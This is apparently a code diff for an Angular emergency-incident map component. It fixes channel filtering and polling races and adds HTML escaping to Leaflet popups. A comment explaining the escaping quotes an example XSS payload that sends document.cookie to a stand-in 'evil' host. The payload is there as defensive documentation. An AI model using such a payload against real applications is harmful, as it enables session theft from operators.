@@ -8,8 +8,8 @@ import {
 } from '@angular/core';
 import { CommonModule } from '@angular/common';
 import { FormsModule } from '@angular/forms';
-import { Subject, interval } from 'rxjs';
-import { takeUntil, switchMap, startWith } from 'rxjs/operators';
+import { Subject, interval, merge } from 'rxjs';
+import { takeUntil, switchMap, startWith, filter } from 'rxjs/operators';
 import { Router } from '@angular/router';
 import { AuthService } from '../../../core/auth/auth.service';
 import { ToastService } from '../../../core/services/toast.service';
@@ -34,12 +34,13 @@ export class MapaIncidentesComponent implements OnInit, AfterViewInit, OnDestroy
   // ── Claims JWT ────────────────────────────────────────────────────────────
   sitioGraba = 0;
   codDane    = '';
-  fuerzaId   = 0;
 
   // ── Estado de la UI ───────────────────────────────────────────────────────
   cargando      = false;
   errorCarga    = false;
   panelAbierto  = false;
+  /** true si la librería Leaflet no cargó (revisar index.html) — se muestra un mensaje en vez de un div vacío. */
+  mapaNoDisponible = false;
   incidenteSeleccionado: DtoMapaIncidente | null = null;
 
   // ── Búsqueda de dirección ─────────────────────────────────────────────────
@@ -50,6 +51,12 @@ export class MapaIncidentesComponent implements OnInit, AfterViewInit, OnDestroy
   filtroPrioridad = '';  // '' = todos
   filtroTexto     = '';  // búsqueda por dirección / código caso
   filtroCanal     = 0;   // 0 = todos los canales (se envía al backend)
+  /**
+   * Fuerza propietaria del canal seleccionado. cad_canales.codigo no es único por sí
+   * solo (cada fuerza numera sus canales desde 1) — sin esto, seleccionar un canal
+   * puede traer también los incidentes del canal homónimo de otra fuerza.
+   */
+  filtroCanalFuerzaId = 0;
 
   // ── Canales disponibles para el filtro ────────────────────────────────────
   canalesDisponibles: DtoCanalItem[] = [];
@@ -76,6 +83,8 @@ export class MapaIncidentesComponent implements OnInit, AfterViewInit, OnDestroy
   private readonly REFRESH_INTERVAL_MS = 30_000; // 30 segundos
 
   private destroy$ = new Subject<void>();
+  /** Dispara una recarga inmediata (cambio de filtro de canal) fuera del ciclo de polling. */
+  private recargar$ = new Subject<void>();
 
   constructor(
     private auth:       AuthService,
@@ -95,7 +104,6 @@ export class MapaIncidentesComponent implements OnInit, AfterViewInit, OnDestroy
     const claims    = this.auth.getJwtClaims();
     this.sitioGraba = claims.sitioGraba;
     this.codDane    = claims.codDane;
-    this.fuerzaId   = claims.fuerzaId;
     this.cargarCanales();
   }
 
@@ -143,6 +151,8 @@ export class MapaIncidentesComponent implements OnInit, AfterViewInit, OnDestroy
   private initMap(): void {
     if (typeof L === 'undefined') {
       console.warn('[Mapa] Leaflet no disponible. Verifique index.html.');
+      this.mapaNoDisponible = true;
+      this.cdr.detectChanges();
       return;
     }
 
@@ -170,12 +180,21 @@ export class MapaIncidentesComponent implements OnInit, AfterViewInit, OnDestroy
   //  Polling de datos
   // ══════════════════════════════════════════════════════════════════════════
 
+  /**
+   * Un único stream (poll cada 30s + recargas manuales por cambio de filtro) con
+   * switchMap: cualquier recarga manual cancela automáticamente un poll en vuelo, y
+   * viceversa — antes eran dos suscripciones independientes que podían pisarse (la
+   * respuesta de un poll con el canal viejo llegaba después que la del cambio de
+   * filtro y dejaba el mapa mostrando el canal incorrecto hasta el siguiente tick).
+   * El poll periódico se pausa mientras la pestaña está oculta.
+   */
   private iniciarPolling(): void {
-    interval(this.REFRESH_INTERVAL_MS).pipe(
+    merge(interval(this.REFRESH_INTERVAL_MS), this.recargar$).pipe(
+      filter(() => !document.hidden),
       startWith(0),
       switchMap(() => {
         this.cargando = true;
-        return this.svc.getIncidentesActivos(this.sitioGraba, this.filtroCanal);
+        return this.svc.getIncidentesActivos(this.sitioGraba, this.filtroCanal, this.filtroCanalFuerzaId);
       }),
       takeUntil(this.destroy$)
     ).subscribe({
@@ -223,10 +242,23 @@ export class MapaIncidentesComponent implements OnInit, AfterViewInit, OnDestroy
       if (isNaN(lat) || isNaN(lng)) continue;
 
       if (this.markers.has(inc.id)) {
-        // Actualizar posición y popup si el marcador ya existe
+        // Actualizar posición, popup e ícono si el marcador ya existe.
+        // _incidente se reasigna en cada sync para que el handler de clic (que lo
+        // lee en el momento del clic, no por closure) siempre vea el dato fresco
+        // — antes el clic directo sobre el pin abría el panel con el snapshot del
+        // momento en que se creó el marcador, aunque el popup ya mostrara datos
+        // actualizados.
         const marker = this.markers.get(inc.id);
         marker.setLatLng([lat, lng]);
         marker.setPopupContent(this.buildPopupContent(inc));
+        // El color/etiqueta del pin codifica la prioridad — sin esto, un
+        // incidente reclasificado (p. ej. de Rutina a Flash) conservaba el
+        // ícono viejo indefinidamente mientras siguiera activo.
+        if (marker._prioridad !== inc.prioridad) {
+          marker.setIcon(this.crearIcono(inc.prioridad));
+          marker._prioridad = inc.prioridad;
+        }
+        marker._incidente = inc;
       } else {
         // Crear nuevo marcador
         const icon   = this.crearIcono(inc.prioridad);
@@ -234,10 +266,12 @@ export class MapaIncidentesComponent implements OnInit, AfterViewInit, OnDestroy
           .bindPopup(this.buildPopupContent(inc), { maxWidth: 280, minWidth: 220 })
           .on('click', () => {
             this.zone.run(() => {
-              this.seleccionarIncidente(inc);
+              this.seleccionarIncidente(marker._incidente);
               this.cdr.detectChanges();
             });
           });
+        marker._prioridad = inc.prioridad;
+        marker._incidente = inc;
         marker.addTo(this.map);
         this.markers.set(inc.id, marker);
       }
@@ -281,6 +315,27 @@ export class MapaIncidentesComponent implements OnInit, AfterViewInit, OnDestroy
     });
   }
 
+  /**
+   * Escapa HTML para interpolación segura en los popups de Leaflet.
+   * bindPopup()/setPopupContent() asignan el string vía innerHTML — nunca pasa
+   * por el sanitizador de Angular porque el DOM lo maneja Leaflet directamente,
+   * no una plantilla con [innerHTML]. Todo campo de texto libre digitado por un
+   * operador (dirección, descripción, barrio, usuario…) debe pasar por aquí
+   * antes de interpolarse, o un valor como
+   * `&lt;img src=x onerror="fetch('https://evil/steal?c='+document.cookie)"&gt;`
+   * capturado en, por ejemplo, dire_caso se ejecutaría en la sesión de
+   * cualquier despachador que abra el mapa.
+   */
+  private escapeHtml(value: string | null | undefined): string {
+    if (!value) return '';
+    return String(value)
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;')
+      .replace(/'/g, '&#39;');
+  }
+
   private buildPopupContent(inc: DtoMapaIncidente): string {
     const estadoBadge = this.estadoBadgeHtml(inc.estado);
     const actuaciones = inc.totalActuaciones > 0
@@ -289,34 +344,47 @@ export class MapaIncidentesComponent implements OnInit, AfterViewInit, OnDestroy
          </span>`
       : `<span style="color:#888">Sin unidades asignadas</span>`;
 
+    const codiPedido    = this.escapeHtml(inc.codiPedido);
+    const descPedido    = this.escapeHtml(inc.descPedido) || 'Sin descripción';
+    const codiPedido2   = this.escapeHtml(inc.codiPedido2);
+    const descPedido2   = this.escapeHtml(inc.descPedido2);
+    const direCaso      = this.escapeHtml(inc.direCaso) || '—';
+    const barrio        = this.escapeHtml(inc.barrio);
+    const horaCaso       = this.escapeHtml(inc.horaCaso);
+    const usernameCreacion = this.escapeHtml(inc.usernameCreacion) || '—';
+    // inc.id es un Snowflake numérico controlado por el backend, pero se valida
+    // igual antes de interpolarlo dentro de un atributo onclick — defensa en
+    // profundidad, no confiar en que el origen del dato nunca cambie.
+    const idSeguro = /^[0-9]+$/.test(inc.id) ? inc.id : '';
+
     const desc2 = inc.codiPedido2
       ? `<div style="font-size:11px;color:#666;margin-top:2px">
-           ${inc.codiPedido2} — ${inc.descPedido2 || ''}
+           ${codiPedido2} — ${descPedido2}
          </div>`
       : '';
 
     return `
       <div style="font-family:sans-serif;min-width:200px">
         <div style="font-weight:700;font-size:13px;margin-bottom:4px;color:#1a1a2e">
-          ${inc.codiPedido} — ${inc.descPedido || 'Sin descripción'}
+          ${codiPedido} — ${descPedido}
         </div>
         ${desc2}
         <div style="font-size:11px;color:#444;margin:6px 0 2px">
           <i class="fa-solid fa-location-dot"></i>
-          ${inc.direCaso || '—'}
-          ${inc.barrio ? ` · ${inc.barrio}` : ''}
+          ${direCaso}
+          ${barrio ? ` · ${barrio}` : ''}
         </div>
         <div style="font-size:11px;color:#555;margin-bottom:6px">
-          <i class="fa-regular fa-clock"></i> ${inc.horaCaso || ''}
+          <i class="fa-regular fa-clock"></i> ${horaCaso}
           &nbsp;|&nbsp;
-          <i class="fa-solid fa-user"></i> ${inc.usernameCreacion || '—'}
+          <i class="fa-solid fa-user"></i> ${usernameCreacion}
         </div>
         <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
           ${estadoBadge}
           ${actuaciones}
         </div>
         <button
-          onclick="window._secadMapaAbrirDetalle && window._secadMapaAbrirDetalle('${inc.id}')"
+          onclick="window._secadMapaAbrirDetalle && window._secadMapaAbrirDetalle('${idSeguro}')"
           style="
             background:#003087;color:#fff;border:none;border-radius:4px;
             padding:4px 10px;font-size:11px;cursor:pointer;width:100%;margin-top:4px
@@ -462,38 +530,31 @@ export class MapaIncidentesComponent implements OnInit, AfterViewInit, OnDestroy
     }
   }
 
-  /** Cambia el filtro de canal y re-consulta el backend inmediatamente. */
-  onCanalChange(): void {
-    this.cargando = true;
-    this.svc.getIncidentesActivos(this.sitioGraba, this.filtroCanal)
-      .pipe(takeUntil(this.destroy$))
-      .subscribe({
-        next: data => {
-          this.zone.run(() => {
-            this.cargando   = false;
-            this.errorCarga = false;
-            this.incidentes = data;
-            this.aplicarFiltros();
-            this.sincronizarMarcadores(data);
-            this.cdr.detectChanges();
-          });
-        },
-        error: () => {
-          this.zone.run(() => {
-            this.cargando   = false;
-            this.errorCarga = true;
-            this.cdr.detectChanges();
-          });
-        }
-      });
+  /**
+   * Clave compuesta código::fuerza para el <select> de canal. cad_canales.codigo
+   * NO es único por sí solo (cada fuerza numera sus canales desde 1) — usar solo
+   * el código para identificar la opción seleccionada confundiría canales de
+   * fuerzas distintas que comparten el mismo código.
+   */
+  canalKey(codigo: number, fuerzaId: number): string {
+    return `${codigo}::${fuerzaId}`;
+  }
+
+  /** Cambia el filtro de canal (clave compuesta) y re-consulta el backend inmediatamente. */
+  onCanalKeyChange(key: string): void {
+    const [codigo, fuerzaId] = key.split('::').map(Number);
+    this.filtroCanal          = codigo   || 0;
+    this.filtroCanalFuerzaId  = fuerzaId || 0;
+    this.recargar$.next();
   }
 
   limpiarFiltros(): void {
-    this.filtroEstado    = '';
-    this.filtroPrioridad = '';
-    this.filtroTexto     = '';
-    this.filtroCanal     = 0;
-    this.onCanalChange();   // re-consulta con canal=0 (todos)
+    this.filtroEstado        = '';
+    this.filtroPrioridad     = '';
+    this.filtroTexto         = '';
+    this.filtroCanal         = 0;
+    this.filtroCanalFuerzaId = 0;
+    this.recargar$.next();
   }
 
   // ══════════════════════════════════════════════════════════════════════════
